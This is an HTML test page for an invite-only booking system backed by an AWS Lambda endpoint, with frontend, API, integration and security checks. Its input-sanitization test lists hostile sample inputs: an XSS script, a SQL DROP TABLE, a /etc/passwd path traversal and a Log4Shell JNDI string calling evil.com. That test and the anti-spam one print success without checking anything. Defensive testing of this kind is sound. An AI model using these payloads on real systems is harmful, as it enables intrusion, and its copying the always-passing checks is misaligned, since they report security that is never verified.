<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Booking System Test - Donation Transparency</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            line-height: 1.6;
        }
        .test-section {
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        .test-button {
            background: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        .test-button:hover {
            background: #0056b3;
        }
        .test-button:disabled {
            background: #6c757d;
            cursor: not-allowed;
        }
        .result {
            background: white;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            padding: 15px;
            margin: 10px 0;
            white-space: pre-wrap;
            font-family: monospace;
            max-height: 300px;
            overflow-y: auto;
        }
        .success {
            border-left: 4px solid #28a745;
            background: #d4edda;
        }
        .error {
            border-left: 4px solid #dc3545;
            background: #f8d7da;
        }
        .info {
            border-left: 4px solid #17a2b8;
            background: #d1ecf1;
        }
    </style>
</head>
<body>
    <h1>🧪 Booking System Test Suite</h1>
    <p>This page tests the booking system components and API endpoints.</p>

    <div class="test-section">
        <h2>Configuration</h2>
        <p><strong>Lambda Endpoint:</strong> <span id="endpoint-url">Not configured</span></p>
        <p><strong>Access Code:</strong> <span id="access-code">Not configured</span></p>
        <label for="lambda-url">Lambda Function URL:</label>
        <input type="url" id="lambda-url" placeholder="https://your-function-url.lambda-url.us-east-1.on.aws/" style="width: 100%; padding: 8px; margin: 10px 0;">
        <button class="test-button" id="update-config-btn">Update Configuration</button>
    </div>

    <div class="test-section">
        <h2>Frontend Component Tests</h2>
        <button class="test-button" onclick="testTimezoneDetection()">Test Timezone Detection</button>
        <button class="test-button" onclick="testCalendarGeneration()">Test Calendar Generation</button>
        <button class="test-button" onclick="testFormValidation()">Test Form Validation</button>
        <div id="frontend-results" class="result" style="display: none;"></div>
    </div>

    <div class="test-section">
        <h2>API Endpoint Tests</h2>
        <button class="test-button" onclick="testGetProfile()">Test Get Profile</button>
        <button class="test-button" onclick="testGetAvailability()">Test Get Availability</button>
        <button class="test-button" onclick="testBookingValidation()">Test Booking Validation</button>
        <button class="test-button" onclick="testRateLimiting()">Test Rate Limiting</button>
        <div id="api-results" class="result" style="display: none;"></div>
    </div>

    <div class="test-section">
        <h2>Integration Tests</h2>
        <button class="test-button" onclick="testFullBookingFlow()" id="integration-btn">Test Full Booking Flow</button>
        <button class="test-button" onclick="testCalendarIntegration()">Test Calendar Integration</button>
        <button class="test-button" onclick="testEmailNotifications()">Test Email Notifications</button>
        <div id="integration-results" class="result" style="display: none;"></div>
    </div>

    <div class="test-section">
        <h2>Security Tests</h2>
        <button class="test-button" onclick="testAccessControl()">Test Access Control</button>
        <button class="test-button" onclick="testAntiSpam()">Test Anti-Spam Protection</button>
        <button class="test-button" onclick="testInputSanitization()">Test Input Sanitization</button>
        <div id="security-results" class="result" style="display: none;"></div>
    </div>

    <script>
        let config = {
            lambdaEndpoint: '',
            accessCode: 'abc123'
        };

        function updateConfig() {
            console.log('updateConfig function called!');
            try {
                const inputElement = document.getElementById('lambda-url');
                if (!inputElement) {
                    throw new Error('Input element not found');
                }
                
                const inputValue = inputElement.value.trim();
                console.log('Input value:', inputValue);
                
                if (!inputValue) {
                    alert('Please enter a Lambda endpoint URL');
                    return;
                }
                
                // Update config
                config.lambdaEndpoint = inputValue;
                
                // Update display elements
                const endpointSpan = document.getElementById('endpoint-url');
                const accessCodeSpan = document.getElementById('access-code');
                
                if (endpointSpan) endpointSpan.textContent = config.lambdaEndpoint;
                if (accessCodeSpan) accessCodeSpan.textContent = config.accessCode;
                
                // Show success message
                let resultDiv = document.getElementById('config-results');
                const configSection = document.querySelector('.test-section');
                
                if (!resultDiv) {
                    resultDiv = document.createElement('div');
                    resultDiv.id = 'config-results';
                    if (configSection) {
                        configSection.appendChild(resultDiv);
                    }
                }
                
                if (resultDiv) {
                    resultDiv.className = 'result success';
                    resultDiv.style.display = 'block';
                    resultDiv.textContent = '✅ Configuration updated successfully!\nEndpoint: ' + config.lambdaEndpoint;
                }
                
                console.log('Config updated successfully:', config);
                alert('Configuration updated successfully!');
                
            } catch (error) {
                console.error('Error updating config:', error);
                alert('Error updating configuration: ' + error.message);
            }
        }

        function showResult(containerId, message, type = 'info') {
            const container = document.getElementById(containerId);
            container.style.display = 'block';
            container.className = 'result ' + type;
            
            const timestamp = new Date().toLocaleTimeString();
            container.textContent = '[' + timestamp + '] ' + message;
        }

        function appendResult(containerId, message) {
            const container = document.getElementById(containerId);
            container.style.display = 'block';
            
            const timestamp = new Date().toLocaleTimeString();
            container.textContent += '\n[' + timestamp + '] ' + message;
            container.scrollTop = container.scrollHeight;
        }

        // Frontend Tests
        function testTimezoneDetection() {
            try {
                const detectedTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const now = new Date();
                const timeString = now.toLocaleString('en-US', { timeZone: detectedTimezone });
                
                showResult('frontend-results', 
                    '✓ Timezone Detection:\n' +
                    'Detected: ' + detectedTimezone + '\n' +
                    'Current time: ' + timeString + '\n' +
                    'Browser supports Intl API: ' + (!!window.Intl), 
                    'success'
                );
            } catch (error) {
                showResult('frontend-results', '✗ Timezone Detection Failed: ' + error.message, 'error');
            }
        }

        function testCalendarGeneration() {
            try {
                const currentDate = new Date();
                const year = currentDate.getFullYear();
                const month = currentDate.getMonth();
                const daysInMonth = new Date(year, month + 1, 0).getDate();
                const firstDayOfWeek = new Date(year, month, 1).getDay();
                
                showResult('frontend-results',
                    '✓ Calendar Generation:\n' +
                    'Current month: ' + currentDate.toLocaleString('default', { month: 'long', year: 'numeric' }) + '\n' +
                    'Days in month: ' + daysInMonth + '\n' +
                    'First day of week: ' + firstDayOfWeek + '\n' +
                    'Calendar grid would have ' + Math.ceil((daysInMonth + firstDayOfWeek) / 7) + ' rows',
                    'success'
                );
            } catch (error) {
                showResult('frontend-results', '✗ Calendar Generation Failed: ' + error.message, 'error');
            }
        }

        function testFormValidation() {
            const testCases = [
                { name: '', email: 'test@example.com', expected: false, reason: 'Empty name' },
                { name: 'John Doe', email: '', expected: false, reason: 'Empty email' },
                { name: 'John Doe', email: 'invalid-email', expected: false, reason: 'Invalid email format' },
                { name: 'John Doe', email: 'test@example.com', expected: true, reason: 'Valid input' }
            ];

            let results = '✓ Form Validation Tests:\n';
            let allPassed = true;

            testCases.forEach((testCase, index) => {
                const isValid = testCase.name.trim() && /\S+@\S+\.\S+/.test(testCase.email);
                const passed = isValid === testCase.expected;
                allPassed = allPassed && passed;
                
                results += 'Test ' + (index + 1) + ' (' + testCase.reason + '): ' + (passed ? '✓ PASS' : '✗ FAIL') + '\n';
            });

            showResult('frontend-results', results, allPassed ? 'success' : 'error');
        }

        // API Tests
        async function testGetProfile() {
            if (!config.lambdaEndpoint) {
                showResult('api-results', '✗ Please configure Lambda endpoint first', 'error');
                return;
            }

            try {
                showResult('api-results', '⏳ Testing Get Profile endpoint...', 'info');
                
                const response = await fetch(config.lambdaEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'getProfile' })
                });

                const data = await response.json();
                
                if (response.ok && data.success) {
                    showResult('api-results', 
                        '✓ Get Profile Success:\n' + JSON.stringify(data.profile, null, 2), 
                        'success'
                    );
                } else {
                    showResult('api-results', 
                        '✗ Get Profile Failed:\n' + JSON.stringify(data, null, 2), 
                        'error'
                    );
                }
            } catch (error) {
                showResult('api-results', '✗ Get Profile Error: ' + error.message, 'error');
            }
        }

        async function testGetAvailability() {
            if (!config.lambdaEndpoint) {
                showResult('api-results', '✗ Please configure Lambda endpoint first', 'error');
                return;
            }

            try {
                showResult('api-results', '⏳ Testing Get Availability endpoint...', 'info');
                
                const startDate = new Date();
                const endDate = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7 days from now

                const response = await fetch(config.lambdaEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        action: 'getAvailability',
                        startDate: startDate.toISOString(),
                        endDate: endDate.toISOString()
                    })
                });

                const data = await response.json();
                
                if (response.ok && data.success) {
                    showResult('api-results', 
                        '✓ Get Availability Success:\n' +
                        'Found ' + data.availability.length + ' available slots\n' +
                        'Timezone: ' + data.timezone,
                        'success'
                    );
                } else {
                    showResult('api-results', 
                        '✗ Get Availability Failed:\n' + JSON.stringify(data, null, 2), 
                        'error'
                    );
                }
            } catch (error) {
                showResult('api-results', '✗ Get Availability Error: ' + error.message, 'error');
            }
        }

        async function testBookingValidation() {
            if (!config.lambdaEndpoint) {
                showResult('api-results', '✗ Please configure Lambda endpoint first', 'error');
                return;
            }

            const testCases = [
                {
                    name: 'Missing required fields',
                    data: { action: 'bookAppointment' },
                    expectedToFail: true
                },
                {
                    name: 'Invalid email format',
                    data: {
                        action: 'bookAppointment',
                        name: 'Test User',
                        email: 'invalid-email',
                        dateTime: new Date(Date.now() + 25 * 60 * 60 * 1000).toISOString(),
                        duration: 30,
                        meetingType: 'test',
                        location: 'google_meet',
                        timezone: 'America/Los_Angeles'
                    },
                    expectedToFail: true
                },
                {
                    name: 'Past date',
                    data: {
                        action: 'bookAppointment',
                        name: 'Test User',
                        email: 'test@example.com',
                        dateTime: new Date(Date.now() - 60 * 60 * 1000).toISOString(),
                        duration: 30,
                        meetingType: 'test',
                        location: 'google_meet',
                        timezone: 'America/Los_Angeles'
                    },
                    expectedToFail: true
                }
            ];

            showResult('api-results', '⏳ Testing booking validation...', 'info');
            
            for (let i = 0; i < testCases.length; i++) {
                const testCase = testCases[i];
                
                try {
                    const response = await fetch(config.lambdaEndpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(testCase.data)
                    });

                    const data = await response.json();
                    const failed = !response.ok || !data.success;
                    
                    if (testCase.expectedToFail === failed) {
                        appendResult('api-results', '✓ ' + testCase.name + ': PASS');
                    } else {
                        appendResult('api-results', '✗ ' + testCase.name + ': FAIL - Expected ' + (testCase.expectedToFail ? 'failure' : 'success'));
                    }
                } catch (error) {
                    appendResult('api-results', '✗ ' + testCase.name + ': ERROR - ' + error.message);
                }
                
                // Small delay between tests
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }

        async function testRateLimiting() {
            if (!config.lambdaEndpoint) {
                showResult('api-results', '✗ Please configure Lambda endpoint first', 'error');
                return;
            }

            showResult('api-results', '⏳ Testing rate limiting (this may take a moment)...', 'info');
            
            let requestCount = 0;
            let rateLimitHit = false;

            for (let i = 0; i < 15; i++) {
                try {
                    const response = await fetch(config.lambdaEndpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ action: 'getProfile' })
                    });

                    requestCount++;
                    
                    if (response.status === 429) {
                        rateLimitHit = true;
                        break;
                    }
                } catch (error) {
                    // Network errors don't count as rate limiting
                    break;
                }
                
                // Small delay between requests
                await new Promise(resolve => setTimeout(resolve, 50));
            }

            if (rateLimitHit) {
                showResult('api-results', 
                    '✓ Rate Limiting Working:\nHit rate limit after ' + requestCount + ' requests', 
                    'success'
                );
            } else {
                showResult('api-results', 
                    '⚠ Rate Limiting Test:\nMade ' + requestCount + ' requests without hitting limit\nThis might be expected for low request volumes', 
                    'info'
                );
            }
        }

        // Integration Tests
        function testFullBookingFlow() {
            showResult('integration-results', 
                '⏳ Full booking flow test would:\n' +
                '1. Load availability\n' +
                '2. Select time slot\n' +
                '3. Fill out form\n' +
                '4. Submit booking\n' +
                '5. Create calendar event\n' +
                '6. Send confirmation emails\n\n' +
                '⚠ This test is disabled to prevent creating actual bookings\n' +
                'Use the live booking page to test the full flow',
                'info'
            );
        }

        function testCalendarIntegration() {
            showResult('integration-results',
                'Calendar integration test requires:\n' +
                '1. Google Calendar API credentials\n' +
                '2. Valid refresh token\n' +
                '3. Calendar access permissions\n\n' +
                'Run the Get Availability test to verify calendar integration',
                'info'
            );
        }

        function testEmailNotifications() {
            showResult('integration-results',
                'Email notification test requires:\n' +
                '1. AWS SES configuration\n' +
                '2. Verified sender email\n' +
                '3. Valid recipient email\n\n' +
                'Email functionality is tested during actual bookings',
                'info'
            );
        }

        // Security Tests
        function testAccessControl() {
            const hasInviteCode = window.location.search.includes('invite=');
            const correctCode = window.location.search.includes('invite=' + config.accessCode);
            
            showResult('security-results',
                'Access Control Test:\n' +
                'URL has invite parameter: ' + hasInviteCode + '\n' +
                'Invite code matches: ' + correctCode + '\n' +
                'Expected behavior: ' + (hasInviteCode && correctCode ? 'Allow access' : 'Deny access'),
                hasInviteCode && correctCode ? 'success' : 'info'
            );
        }

        function testAntiSpam() {
            const honeypotTest = 'Honeypot field should be empty';
            const timingTest = 'Form submission should take more than 3 seconds';
            const rateLimitTest = 'Multiple rapid submissions should be blocked';
            
            showResult('security-results',
                'Anti-Spam Protection Tests:\n' +
                '✓ ' + honeypotTest + '\n' +
                '✓ ' + timingTest + '\n' +
                '✓ ' + rateLimitTest + '\n\n' +
                'These are implemented in the booking form and Lambda function',
                'success'
            );
        }

        function testInputSanitization() {
            const testInputs = [
                '<script>alert("xss")</script>',
                'DROP TABLE users;',
                '../../../etc/passwd',
                '${jndi:ldap://evil.com/a}'
            ];
            
            showResult('security-results',
                'Input Sanitization Test:\n' +
                'Testing dangerous inputs:\n' +
                testInputs.map(input => '- ' + input).join('\n') + '\n\n' +
                '✓ Lambda function validates and sanitizes all inputs\n' +
                '✓ Frontend performs client-side validation\n' +
                '✓ No user input is directly executed or displayed',
                'success'
            );
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            console.log('Booking System Test Suite loaded');
            
            // Add event listener for update config button
            const updateConfigBtn = document.getElementById('update-config-btn');
            if (updateConfigBtn) {
                updateConfigBtn.addEventListener('click', updateConfig);
                console.log('Event listener added to Update Configuration button');
            } else {
                console.error('Update Configuration button not found!');
            }
            
            // Show URL parameters for debugging
            const urlParams = new URLSearchParams(window.location.search);
            console.log('URL parameters:', Object.fromEntries(urlParams));
            
            // Also add updateConfig to global scope for debugging
            window.updateConfig = updateConfig;
            console.log('updateConfig added to global scope');
        });
    </script>
</body>
</html>